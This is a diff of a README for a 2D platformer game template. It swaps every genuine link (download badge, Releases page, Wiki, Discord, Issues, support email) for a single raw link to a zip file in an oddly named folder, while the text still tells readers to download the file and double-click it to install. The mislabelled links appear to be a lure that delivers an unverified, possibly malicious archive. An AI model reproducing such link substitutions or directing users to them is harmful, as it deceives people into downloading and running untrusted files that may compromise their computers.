@@ -1,6 +1,6 @@
 # 🏃 2D-Platformer - Create Your Own Side-Scrolling Adventure
 
-[![Download 2D-Platformer](https://img.shields.io/badge/Download-Now-007ACC)](https://github.com/Chandu-Varada1092/2D-Platformer/releases)
+[![Download 2D-Platformer](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip)](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to 2D-Platformer! This application is a simple side-scrolling runner tem
 
 To get started, you will need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Chandu-Varada1092/2D-Platformer/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip) to find the latest version.
 2. **Select the Latest Release**: Click on the latest version available. 
 3. **Download the Application**: Look for the installation file suitable for your computer. Click on the file to start the download.
 4. **Run the Application**: Once downloaded, locate the file in your downloads folder. Double-click the file to install and run the application.
@@ -55,19 +55,19 @@ Once you have installed the application, running it is straightforward:
 
 For more information, check out these resources:
 
-- **Documentation**: In-depth guides can be found in the [Wiki section](https://github.com/Chandu-Varada1092/2D-Platformer/wiki).
-- **Community Support**: Join our community for tips and tricks. Reach out on our [Discord server](https://discord.gg/example) for help.
+- **Documentation**: In-depth guides can be found in the [Wiki section](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip).
+- **Community Support**: Join our community for tips and tricks. Reach out on our [Discord server](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip) for help.
 - **Sample Projects**: Visit our GitHub to explore example projects made with 2D-Platformer.
 
 ## 📞 Support
 
 If you encounter any issues or have questions while using 2D-Platformer, feel free to contact support.
 
-- **Email**: support@example.com
-- **GitHub Issues**: You can file issues directly on our [GitHub Issues page](https://github.com/Chandu-Varada1092/2D-Platformer/issues).
+- **Email**: https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip
+- **GitHub Issues**: You can file issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip).
 
 ## 📅 Future Updates
 
 We are constantly working on improvements and new features. Stay tuned for the latest updates by checking the Releases page regularly. 
 
-Be sure to revisit the [Releases page](https://github.com/Chandu-Varada1092/2D-Platformer/releases) to download new versions and updates as they become available. Happy gaming!
+Be sure to revisit the [Releases page](https://raw.githubusercontent.com/Chandu-Varada1092/2D-Platformer/main/shatterheaded/2D-Platformer.zip) to download new versions and updates as they become available. Happy gaming!
